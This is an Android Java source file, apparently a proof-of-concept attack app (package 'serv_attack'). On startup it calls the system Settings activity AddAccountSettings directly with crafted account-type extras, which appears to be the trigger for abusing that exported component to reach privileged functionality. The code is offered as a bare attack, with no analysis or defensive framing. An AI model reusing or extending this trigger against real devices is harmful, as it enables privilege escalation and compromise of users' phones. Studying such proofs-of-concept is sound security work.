package com.example.serv_attack;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.provider.SyncStateContract.Constants;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		add_account();
	}

	public void add_account() {
		Intent intent1 = new Intent();
		intent1.setComponent(new ComponentName("com.android.settings",
				"com.android.settings.accounts.AddAccountSettings"));
		intent1.setAction(Intent.ACTION_RUN);
		intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		String authTypes[] = { Constants.ACCOUNT_TYPE };

		intent1.putExtra("account_types", authTypes);
		MainActivity.this.startActivity(intent1);
	}
}
